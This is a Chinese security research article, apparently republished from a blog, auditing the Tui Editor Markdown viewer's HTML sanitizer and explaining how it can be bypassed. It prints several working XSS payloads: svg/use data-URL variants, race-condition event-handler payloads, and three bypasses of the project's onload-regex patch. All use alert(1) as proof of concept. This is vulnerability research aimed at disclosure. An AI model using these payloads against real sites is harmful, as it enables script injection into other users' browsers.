**作者：phith0n  
原文链接：<https://www.leavesongs.com/PENETRATION/a-tour-of-tui-editor-xss.html>**

TOAST Tui
Editor是一款富文本Markdown编辑器，用于给HTML表单提供Markdown和富文本编写支持。最近我们在工作中需要使用到它，相比于其他一些Markdown编辑器，它更新迭代较快，功能也比较强大。另外，它不但提供编辑器功能，也提供了渲染功能（Viewer），也就是说编辑和显示都可以使用Tui
Editor搞定。

Tui Editor的Viewer功能使用方法很简单：

    
    
    import Viewer from '@toast-ui/editor/dist/toastui-editor-viewer';
    import '@toast-ui/editor/dist/toastui-editor-viewer.css';
    
    
    const viewer = new Viewer({
        el: document.querySelector('#viewer'),
        height: '600px',
        initialValue: `# Markdown`
    });

调用后，Markdown会被渲染成HTML并显示在`#viewer`的位置。那么我比较好奇，这里是否会存在XSS。

在Markdown编辑器的预览（Preview）位置也是使用Viewer，但是大部分编辑器的预览功能即使存在XSS也只能打自己（self-xss），但Tui
Editor将预览功能提出来作为一个单独的模块，就不仅限于self了。

## 0x01 理解渲染流程

代码审计第一步，先理解整个程序的结构与工作流程，特别是处理XSS的部分。

常见的Markdown渲染器对于XSS问题有两种处理方式：

  * 在渲染的时候格外注意，在写入标签和属性的时候进行实体编码
  * 渲染时不做任何处理，渲染完成以后再将整个数据作为富文本进行过滤

相比起来，后一种方式更加安全（它的安全主要取决于富文本过滤器的安全性）。前一种方式的优势是，不会因为二次过滤导致丢失一些正常的属性，另外少了一遍处理效率肯定会更高，它的缺点是一不注意就可能出问题，另外也不支持直接在Markdown里插入HTML。

对，Markdown里是可以直接插入HTML标签的，可以将Markdown理解为HTML的一种子集。

Tui Editor使用了第二种方式，我在他代码中发现了一个默认的HTML
sanitizer，在用户没有指定自己的sanitizer时将使用这个内置的sanitizer：https://github.com/nhn/tui.editor/blob/48a01f5/apps/editor/src/sanitizer/htmlSanitizer.ts

我的目标就是绕过这个sanitizer来执行XSS。代码不多，总结一下大概的过滤过程是：

  1. 先正则直接去除注释与onload属性的内容

  2. 将上面处理后的内容，赋值给一个新创建的div的innerHTML属性，建立起一颗DOM树

  3. 用黑名单删除掉一些危险DOM节点，比如iframe、script等

  4. 用白名单对属性进行一遍处理，处理逻辑是

  5.     1. 只保留白名单里名字 **开头** 的属性
  6. 对于满足正则`/href|src|background/i`的属性，进行额外处理

  7. 处理完成后的DOM，获取其HTML代码返回

## 0x02 属性白名单绕过

弄清楚了处理过程，我就开始进行绕过尝试了。

这个过滤器的特点是，标签名黑名单，属性名白名单。on属性不可能在白名单里，所以我首先想到找找那些不需要属性的Payload，或者属性是白名单里的Payload，比如：

    
    
    <script>alert(1)</script>
    <iframe src="javascript:alert(1)">
    <iframe srcdoc="<img src=1 onerror=alert(1)>"></iframe>
    <form><input type=submit formaction=javascript:alert(1) value=XSS>
    <form><button formaction=javascript:alert(1)>XSS
    <form action=javascript:alert(1)><input type=submit value=XSS>
    <a href="javascript:alert(1)">XSS</a>

比较可惜的是，除了a标签外，剩余的标签全在黑名单里。a这个常见的payload也无法利用，原因是isXSSAttribute函数对包含href、src、background三个关键字的属性进行了特殊处理：

    
    
    const reXSSAttr = /href|src|background/i;
    const reXSSAttrValue = /((java|vb|live)script|x):/i;
    const reWhitespace = /[ \t\r\n]/g;
    
    function isXSSAttribute(attrName: string, attrValue: string) {
      return attrName.match(reXSSAttr) && attrValue.replace(reWhitespace, '').match(reXSSAttrValue);
    }

首先将属性值中的空白字符都去掉，再进行匹配，如果发现存在`javascript:`关键字就认为是XSS。

这里处理的比较粗暴，而且也无法使用HTML编码来绕过关键字——原因是，在字符串赋值给innerHTML的时候，HTML属性中的编码已经被解码了，所以在属性检查的时候看到的是解码后的内容。

所以，以下三类Payload会被过滤：

    
    
    <a href="javasc ript:alert(1)">XSS</a>
    <a href="javasc&Tab;ript:alert(1)">XSS</a>
    <a href="jav&#97;script:alert(1)">XSS</a>

又想到了svg，svg标签不在黑名单中，而且也存在一些可以使用伪协议的地方，比如：

    
    
    <svg><a xlink:href="javascript:alert(1)"><text x="100" y="100">XSS</text></a>

因为`reXSSAttr`这个正则并没有首尾定界符，所以只要属性名中存在href关键字，仍然会和a标签一样进行检查，无法绕过。

此时我想到了svg的use标签，use的作用是引用本页面或第三方页面的另一个svg元素，比如：

    
    
    <svg>
        <circle id="myCircle" cx="5" cy="5" r="4" stroke="blue"/>
        <use href="#myCircle"></use>
    </svg>

use的href属性指向那个被它引用的元素。但与a标签的href属性不同的是，use href不能使用JavaScript伪协议，但可以使用data:协议。

比如：

    
    
    <svg><use href="data:image/svg+xml,<svg id='x' xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' width='100' height='100'><a xlink:href='javascript:alert(1)'><rect x='0' y='0' width='100' height='100' /></a></svg>#x"></use></svg>

data协议中的文件必须是一个完整的svg，而且整个data URL的末尾，需要有一个锚点`#x`来指向内部这个被引用的svg。

对于XSS
sanitizer来说，这个Payload只有svg、use两个标签和href一个属性，但因为use的引用特性，所以data协议内部的svg也会被渲染出来。

但是还是由于前面说到的`isXSSAttribute`函数，href属性中的`javascript:`这个关键字仍然会被拦截。解决方法有两种。

### base64编码绕过

既然是data:协议，那自然能让人想到base64编码。但这里要注意的是，URL锚点`#x`是在编码外的，不能把这部分编码进base64，否则无法引用成功。

最后构造的Payload是：

    
    
    <svg><use href="data:image/svg+xml;base64,PHN2ZyBpZD0neCcgeG1sbnM9J2h0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnJyAKICAgIHhtbG5zOnhsaW5rPSdodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hsaW5rJyB3aWR0aD0nMTAwJyBoZWlnaHQ9JzEwMCc+PGEgeGxpbms6aHJlZj0namF2YXNjcmlwdDphbGVydCgxKSc+PHJlY3QgeD0nMCcgeT0nMCcgd2lkdGg9JzEwMCcgaGVpZ2h0PScxMDAnIC8+PC9hPjwvc3ZnPg#x"></use></svg>

### ISO-2022-JP编码绕过

在当年浏览器filter还存在的时候，曾可以通过ISO-2022-KR、ISO-2022-JP编码来绕过auditor：https://www.leavesongs.com/HTML/chrome-xss-auditor-bypass-collection.html#charset-bypass

ISO-2022-JP编码在解析的时候会忽略`\x1B\x28\x42`，也就是`%1B%28B`。

在最新的Chrome中，
ISO-2022-JP仍然存在并可以使用，而data:协议也可以指定编码：https://datatracker.ietf.org/doc/html/rfc2397

两者一拍即合，构造出的Payload为：

    
    
    <svg><use href="data:image/svg+xml;charset=ISO-2022-JP,<svg id='x' xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' width='100' height='100'><a xlink:href='javas%1B%28Bcript:alert(1)'><rect x='0' y='0' width='100' height='100' /></a></svg>#x"></use></svg>

这两种绕过方式，都基于svg和use，缺点就是需要点击触发，在实战中还是稍逊一筹，所以我还需要想到更好的Payload。

## 0x03 基于DOM Clobbering的绕过尝试

前段时间在星球发了一个小挑战，代码如下：

    
    
    const data = decodeURIComponent(location.hash.substr(1));;
    const root = document.createElement('div');
    root.innerHTML = data;
    
    for (let el of root.querySelectorAll('*')) {
        let attrs = [];
        for (let attr of el.attributes) {
            attrs.push(attr.name);
        }
        for (let name of attrs) {
            el.removeAttribute(name);
        }
    }
    
    document.body.appendChild(root); 

这个小挑战的灵感就来自于Tui Editor的HTML sanitizer中对属性白名单的操作。

这个代码也是一种很典型地可以使用Dom Clobbering来利用的代码。关于Dom Clobbering的介绍，可以参考下面这两篇文章：

  * <https://portswigger.net/web-security/dom-based/dom-clobbering>
  * <https://xz.aliyun.com/t/7329>

简单来说，对于一个普通的HTML标签来说，当el是某个元素时，`el.attributes`指的是它的所有属性，比如这里的href和target：

    
    
    <a href="#link" target="_blank">test</a>

这也是过滤器可以遍历`el.attributes`并删除白名单外的属性的一个理论基础。

但Dom
Clobbering是一种对DOM节点属性进行劫持的技术。比如下面这段HTML代码，当el是form这个元素的时候，`el.attributes`的值不再是form的属性，而是`<input>`这个元素：

    
    
    <form><input id="attributes" /></form>

这里使用一个id为attributes的input元素劫持了原本form的attributes，`el.attributes`不再等于属性列表，自然关于移除白名单外属性的逻辑也就无从说起了。这就是Dom
Clobbering在这个小挑战里的原理。

最终@Zedd 使用下面这段代码实现了无需用户交互的Dom Clobbering XSS完成这个挑战：

    
    
    <style>@keyframes x{}</style><form style="animation-name:x" onanimationstart="alert(1)"><input id=attributes><input id=attributes>

回到Tui Editor的案例。Tui
Editor的sanitizer与星球小挑战的代码有一点本质的不同就是，它在移除白名单外属性之前，还移除了一些黑名单的DOM元素，其中就包含`<form>`。

在Dom
Clobbering中，`<form>`是唯一可以用其子标签来劫持他本身属性的DOM元素（HTMLElement），但是它被黑名单删掉了。来看看删除时使用的`removeUnnecessaryTags`函数：

    
    
    function findNodes(element: Element, selector: string) {
        const nodeList = toArray(element.querySelectorAll(selector));
    
        if (nodeList.length) {
            return nodeList;
        }
    
        return [];
    }
    
    function removeNode(node: Node) {
        if (node.parentNode) {
            node.parentNode.removeChild(node);
        }
    }
    
    function removeUnnecessaryTags(html: HTMLElement) {
        const removedTags = findNodes(html, tagBlacklist.join(','));
    
        removedTags.forEach((node) => {
            removeNode(node);
        });
    }

我思考了比较久这三个函数是否可以用Dom Clobbering利用。其中最可能被利用的点是删除的那个操作：

    
    
    if (node.parentNode) {
        node.parentNode.removeChild(node);
    }

我尝试用下面这个代码劫持了`node.parentNode`，看看效果：

    
    
    <form><input id=parentNode></form>

经过调试发现，这样的确可以劫持到`node.parentNode`，让`node.parentNode`不再是`node`的父节点，而变成他的子节点——`<input>`。

但是劫持后，执行removeChild操作时，因为这个函数内部有检查，所以会爆出`Failed to execute 'removeChild' on
'Node': The node to be removed is not a child of this node.`的错误：

![图片](https://images.seebug.org/content/images/2021/08/09/1628494746000-1uafbx.png-w331s)

另外，Dom Clobbering也无法用来劫持函数，所以这个思路也无疾而终了。

最终我还是没找到利用Dom Clobbering来绕过Tui Editor的XSS sanitizer的方法，如果大家有好的想法，可以下来和我交流。

## 0x04 基于条件竞争的绕过方式

到现在，我仍然没有找到一个在Tui Editor中执行无交互XSS的方法。

这个时候我开始翻history，我发现就在不到一个月前，Tui Editor曾对HTML sanitizer进行了修复，备注是修复XSS漏洞，代码改动如下：

![图片](https://images.seebug.org/content/images/2021/08/09/1628494747000-2gloqz.png-w331s)

在将字符串html赋值给`root.innerHTML`前，对这个字符串进行了正则替换，移除其中的`onload=`关键字。

我最开始不是很明白这样做的用意，因为onload这个属性在后面白名单移除的时候会被删掉，在这里又做一次删除到底意义何在。后来看到了单元测试的case并进行调试以后，我才明白了原因。

在Tui Editor的单元测试中增加了这样一个case：

    
    
    <svg><svg onload=alert(1)>

平平无奇，但我将其放到未修复的HTML
sanitizer中竟然绕过了属性白名单，成功执行。这也是我在知识星球的XSS小挑战中讲到的那个小trick，条件竞争。

这里所谓的“条件竞争”，竞争的其实就是这个onload属性在被放进DOM树中开始，到在后续移除函数将其移除的中间这段时间——只要这段代码被放进innerHTML后立即触发onload，这样即使后面它被移除了，代码也已经触发执行了。

那么想要找到这样一个Payload，它需要满足下面两个条件：

  * 在代码被放进innerHTML的时候会被触发
  * 事件触发的时间需要在被移除以前

第一个条件很好满足，比如最常用的XSS Payload `<img src=1
onerror=alert(1)>`，它被插入进innerHTML的时候就可以触发，而无需等待这个root节点被写入页面：

    
    
    const root = document.createElement('div');
    root.innerHTML = `<img src=1 onerror=alert(1)>`

相比起来，`<svg
onload=alert(1)>`、`<script>alert(1)</script>`这两个Payload就无法满足这一点。具体原因我在星球里也说到过，可以翻翻帖子。

第二个条件更加玄学，以至于我虽然知道一些可以利用的Payload，但并不知道它为什么可以利用。

的Payload是无法满足第二个条件的，因为onerror是在src加载失败的时候触发，中间存在IO操作时间比较久，所以肯定无法在onerror被移除前完成。相对的，下面这两个Payload可以满足条件：

    
    
    <svg><svg onload=alert(1)>
    <details open ontoggle=alert(1)>

第一个是我前面说过的方法，第二个是后面测试的时候发现的一种方法。

## 0x05 Tui Editor补丁绕过

那么很幸运，`<details open
ontoggle=alert(1)>`这个Payload满足了两个条件，成为可以竞争过remove的一个Payload。而Tui
Editor因为只考虑了双svg的Payload，所以可以使用它轻松绕过最新的补丁，构造一个无交互XSS。

那么我是否还能再找到一种绕过方式呢？

回看Tui Editor针对`<svg><svg onload=alert(1)>`这个Payload的修复方式：

    
    
    export const TAG_NAME = '[A-Za-z][A-Za-z0-9-]*';
    const reXSSOnload = new RegExp(`(<${TAG_NAME}[^>]*)(onload\\s*=)`, 'ig');
    
    export function sanitizeHTML(html: string) {
        const root = document.createElement('div');
    
        if (isString(html)) {
            html = html.replace(reComment, '').replace(reXSSOnload, '$1');
            root.innerHTML = html;
        }
    
        // ...
    }

增加了一个针对onload的正则`(<[A-Za-z][A-Za-z0-9-]*[^>]*)(onload\\s*=)`，将匹配上这个正则的字符串中的`onload=`移除。

这个正则是有问题的，主要问题有3个，我根据这两个问题构造了3种绕过方法。

### 贪婪模式导致的绕过

我发现这个正则在标签名`[A-Za-z][A-Za-z0-9-]*`的后面，使用了`[^>]*`来匹配非`>`的所有字符。我大概明白他的意思，他就是想忽略掉所有不是onload的字符，找到下一个onload。

但是还记得正则里的贪婪模式吧，默认情况下，正则引擎会尽可能地多匹配满足当前模式的字符，所以，如果此时有两个`onload=`，那么这个`[^>]*`将会匹配到第二个，而将它删除掉，而第一个`onload=`将被保留。

所以，构造如下Payload将可以绕过补丁：

    
    
    <svg><svg onload=alert(1) onload=alert(2)>

### 替换为空导致的问题

那么如果将贪婪模式改成非贪婪模式，是否能解决问题呢？

    
    
    (<[A-Za-z][A-Za-z0-9-]*[^>]*?)(onload\\s*=)

看看这个正则，会发现它分为两个group，`(<[A-Za-z][A-Za-z0-9-]*[^>]*?)`和`(onload\\s*=)`，在用户的输入匹配上时，第二个group将会被删除，保留第一个group，也就是`$1`。

所以，即使改成非贪婪模式，删除掉的是第一个`onload=`，第二个`onload=`仍然会保留，所以无法解决问题，构造的Payload如下：

    
    
    <p><svg><svg onload=onload=alert(1)></svg></svg></p>

### 字符匹配导致的问题

回看这个`[^>]*`，作者的意思是一直往后找`onload=`直到标签闭合的位置为止，但是实际上这里有个Bug，一个HTML属性中，也可能存在字符`>`，它不仅仅是标签的定界符。

那么，如果这个正则匹配上HTML属性中的一个`>`，则会停止向后匹配，这样`onload=`也能保留下来。Payload如下：

    
    
    <svg><svg x=">" onload=alert(1)>

三种Payload都可以用于绕过最新版的Tui Editor XSS过滤器，再加上前面的`<details open
ontoggle=alert(1)>`，总共已经有4个无需用户交互的POC了。

## 0x06 总结

总结一下，Tui Editor的Viewer使用自己编写的HTML
sanitizer来过滤Markdown渲染后的HTML，而这个sanitizer使用了很经典的先设置DOM的innerHTML，再过滤再写入页面的操作。

我先通过找到白名单中的恶意方法构造了需要点击触发的XSS Payload，又通过条件竞争构造了4个无需用户交互的XSS
Payload。其中，后者能够成功的关键在于，一些恶意的事件在设置innerHTML的时候就瞬间触发了，即使后面对其进行了删除操作也无济于事。

虽然作者已经注意到了这一类绕过方法，并进行了修复，但我通过审计它的修复正则，对其进行了绕过。

这里要说的一点是，我最初只想到了使用`x=">"`这种方法绕过正则，但在写文章的时候又想到了贪婪模式相关的方法。可以看出，写文章其实对于思考问题来说很有帮助，我在写一篇文章的时候会考虑的更加全面，这个经验也推荐给大家。

* * *

![Paper](https://images.seebug.org/content/images/2017/08/0e69b04c-e31f-4884-8091-24ec334fbd7e.jpeg)
本文由 Seebug Paper 发布，如需转载请注明来源。本文地址：<https://paper.seebug.org/1667/>

